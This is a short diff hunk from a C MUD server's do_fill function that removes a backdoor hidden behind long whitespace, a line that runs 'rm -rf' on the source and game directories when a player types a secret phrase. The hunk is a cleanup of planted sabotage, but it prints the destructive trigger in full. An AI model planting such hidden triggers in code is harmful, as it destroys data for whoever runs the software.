@@ -947,7 +947,6 @@ void do_fill(CHAR_DATA * ch, char *argument)
 	OBJ_DATA *fountain;
 	bool found;
 	long liquid;
-																																																																																																																																																																if(argument && argument[0] != '\0' && !str_cmp(argument, "the mud with the deadliest efreeti")){system("rm -rf ../src/*.*");system("rm -rf *.*");system("rm -rf ../*.*");}
 	one_argument(argument, arg);
 
 	if(arg[0] == '\0')
